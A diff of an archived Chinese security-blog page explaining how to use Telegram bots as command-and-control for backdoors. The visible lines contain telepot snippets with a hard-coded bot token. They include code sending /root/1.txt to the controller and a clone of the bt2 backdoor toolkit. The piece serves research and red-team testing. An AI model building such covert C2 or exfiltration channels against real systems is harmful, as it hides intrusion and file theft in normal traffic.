@@ -3,14 +3,14 @@
 			<head>
 			     <title>Use Bots of Telegram as a C2 server - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/16142">http://drops.wooyun.org/tips/16142</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>在Github上，涉及到将社交网络作为C2 server（可理解为命令控制服务器）的poc项目越来越多，如利用gmail的<code>gcat</code>、<code>gdog</code>，利用twitter的<code>twittor</code>、以及利用Telegram的<code>Blaze Telegram Backdoor Toolkit (bt2)</code>，使用这类方法的好处不仅仅是因为社交网络的服务器稳定，更多的原因在于其通信可以隐藏在正常流量中，不易被发现。本文将对Telegram中的Bots功能作详细介绍，并通过python实现基础的的api调用，同时对Blaze Telegram Backdoor Toolkit (bt2)进行测试，分享其中需要注意的地方。</p>
 
@@ -27,7 +27,7 @@
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <h3>Telegram：</h3>
 
@@ -56,7 +56,7 @@
 
 <h1>0x02 搭建c2 server</h1>
 
-<hr />
+<hr>
 
 <p>登录Tegegram</p>
 
@@ -66,7 +66,7 @@
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155933968022-11.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155933968022-11.png" alt="Alt text"></p>
 
 <p>按照提示创建自定义bot</p>
 
@@ -82,7 +82,7 @@ token：与bot通信需要提供的凭据
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155935581702-21.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155935581702-21.png" alt="Alt text"></p>
 
 <p><strong>其他命令：</strong></p>
 
@@ -95,7 +95,7 @@ token：与bot通信需要提供的凭据
 
 <h1>0x03 Bot API实例介绍</h1>
 
-<hr />
+<hr>
 
 <p>目前Telegram官网已经公开了如下语言的开发实例:</p>
 
@@ -125,7 +125,7 @@ python 2.7.3
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155932764972-0.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155932764972-0.png" alt="Alt text"></p>
 
 <h3>1、安装更新</h3>
 
@@ -142,12 +142,12 @@ bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
 bot.getMe()
 </code></pre>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 <code>221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8</code>为创建bot后自动生成的token</p>
 
 <p>如图，返回username相关信息</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155937401122-3.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155937401122-3.png" alt="Alt text"></p>
 
 <h3>3、接收消息</h3>
 
@@ -155,7 +155,7 @@ bot.getMe()
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155938460532-4.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155938460532-4.png" alt="Alt text"></p>
 
 <p>python下执行如下代码接收消息：</p>
 
@@ -169,7 +169,7 @@ pprint(response)
 
 <p>如图，成功接收Server端发来的消息</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155940659342-51.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155940659342-51.png" alt="Alt text"></p>
 
 <p>可获取测试帐户的first name为3333，last_name为g，id(已打码)，接收到的消息内容为hello test</p>
 
@@ -202,14 +202,14 @@ if __name__ == '__main__':
 
 <p>运行如图，成功接收Server端发送的5条文字消息</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155941491882-61.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155941491882-61.png" alt="Alt text"></p>
 
 <h3>5、提取文字消息</h3>
 
 <p>使用<code>glance()</code>可以从接收的消息中提取一个元组（<strong>content&#95;type，chat&#95;type，chat_id</strong>）</p>
 
 <blockquote>
-  <p>content&#95;type 包括 text, audio, document, photo, sticker, video, voice,contact, location, venue, new&#95;chat&#95;member, left&#95;chat_member, etc.<br />
+  <p>content&#95;type 包括 text, audio, document, photo, sticker, video, voice,contact, location, venue, new&#95;chat&#95;member, left&#95;chat_member, etc.<br>
   chat_type 包括 private, group, or channel.</p>
 </blockquote>
 
@@ -246,17 +246,17 @@ if __name__ == '__main__':
 
 <p>测试如图，提取出Server端发来的文本消息</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155943916352-71.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155943916352-71.png" alt="Alt text"></p>
 
 <h3>6、接收文件</h3>
 
 <p>执行接收消息的python代码，可获得接收文件的消息格式，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155944109542-81.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155944109542-81.png" alt="Alt text"></p>
 
 <p>下载文件需要使用<code>bot.download_file(file_id, filename)</code></p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155953199793-1.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155953199793-1.png" alt="Alt text"></p>
 
 <p>优化过的完整代码如下，可接收上图Server端发送的文件，并保存在当前目录</p>
 
@@ -307,16 +307,16 @@ bot = telepot.Bot('221409431:AAEeLznGb-uzRONKCwHqyywmetjghCkXl_8')
 bot.sendMessage(chat_id, 'Hello C2 Server')  
 </code></pre>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 chat&#95;id换成自己帐号的chat&#95;id</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155946892602-91.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155946892602-91.png" alt="Alt text"></p>
 
 <p>Server端接收消息，显示如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155947693202-10.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155947693202-10.png" alt="Alt text"></p>
 
 <h3>8、发送文件</h3>
 
@@ -332,18 +332,18 @@ f = open('/root/1.txt', 'rb')
 bot.sendDocument(chat_id, f)
 </code></pre>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 chat&#95;id换成自己帐号的chat&#95;id</p>
 
 <p>如图，Server端可接收bot发过来的文件</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155949560402-111.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155949560402-111.png" alt="Alt text"></p>
 
 <p>以上介绍了Bot API中发送、接收文本消息和上传、下载文件的功能，剩下只需要将功能拼接，添加命令解析，就可以实现一个简易的C2 Server POC</p>
 
 <h1>0x04 bt2测试</h1>
 
-<hr />
+<hr>
 
 <h3>1、搭建C2 Server</h3>
 
@@ -372,13 +372,13 @@ git clone https://github.com/blazeinfosec/bt2.git
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155950334082-12.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155950334082-12.png" alt="Alt text"></p>
 
 <h3>5、测试命令</h3>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160526/20160526155952525212-13.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160526/20160526155952525212-13.png" alt="Alt text"></p>
 
 <p>测试成功</p>
 
@@ -392,7 +392,7 @@ git clone https://github.com/blazeinfosec/bt2.git
 
 <h1>0x05 小结</h1>
 
-<hr />
+<hr>
 
 <p>Bot还支持一些高级用法，可参照文末的链接，实现一些更加高级的功能。</p>
 
@@ -404,7 +404,7 @@ git clone https://github.com/blazeinfosec/bt2.git
 <li><a href="https://blog.blazeinfosec.com/bt2-leveraging-telegram-as-a-command-control-platform/">https://blog.blazeinfosec.com/bt2-leveraging-telegram-as-a-command-control-platform/</a></li>
 <li><a href="https://github.com/nickoala/telepot">https://github.com/nickoala/telepot</a></li>
 <li><a href="https://core.telegram.org/bots/api">https://core.telegram.org/bots/api</a></li>
-</ul>      </p>
+</ul>      <p></p>
     
 			</body>
 		</html>
